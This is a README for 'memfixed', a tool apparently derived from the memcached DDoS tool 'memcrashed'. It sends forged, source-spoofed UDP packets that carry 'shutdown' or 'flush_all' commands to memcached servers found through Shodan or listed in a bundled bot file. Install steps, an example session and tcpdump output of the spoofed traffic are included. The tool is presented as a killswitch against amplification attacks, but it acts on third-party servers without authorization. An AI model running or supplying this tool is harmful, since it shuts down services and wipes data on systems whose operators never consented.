Memfixed killswitch shamelessly copied from memcrashed  
  
Shutdown variant : Sends shutdown\r\n to the list of known memcached servers found on Shodan.  
  
Flushall variant : Sends flush_all\r\n to the list of known memcached servers found on Shodan.  
  
Uses Python 2.7  
pip install pathlib  
pip install scapy  
pip install shodan  
  
  
Example usage  
cp bots_20180309.txt bots.txt  
[root@ip-172-31-28-150 memfixed]# ./memfixed-shutdown.py  
Free memcached attack kill Switch shamelessly copied from memcrashed.  
Shutdown variant.  
Need Shodan API Key or use built-in bots.txt  
[*] Use Shodan API to search for affected Memcached servers? <Y/n>: n  
[*] Would you like to use locally stored Shodan data? <Y/n>: y  
[▸] Enter  IP address to protect from attack: 1.2.3.4  
[▸] Enter preferred power (Default 1):  
[*] Would you like to display all the bots stored locally? <Y/n>: n  
[*] Ready to protect source 1.2.3.4? <Y/n>: y  
[+] Sending 1 forged UDP packet to: xx.xx.xx.xx  
.[+] Sending 1 forged UDP packet to: xx.xx.xx.xx   
.[+] Sending 1 forged UDP packet to: xx.xx.xx.xx  
.[+] Sending 1 forged UDP packet to: xx.xx.xx.xx  
.  
[•] Task complete! Exiting Platform. Have a wonderful day.  
  
  
  
Sample generated trafic  
[root@ip-172-31-28-150 ~]# tcpdump -n dst port 11211  
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode  
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes  
09:18:38.632494 IP 1.2.3.4.domain > xx.xx.xx.xx.memcache: 0 [29544n] [30068au][|domain]  
09:18:38.639990 IP 1.2.3.4.domain > xx.xx.xx.xx.memcache: 0 [29544n] [30068au][|domain]  
09:18:38.648325 IP 1.2.3.4.domain > xx.xx.xx.xx.memcache: 0 [29544n] [30068au][|domain]  
09:18:38.654953 IP 1.2.3.4.domain > xx.xx.xx.xx.memcache: 0 [29544n] [30068au][|domain]  
  

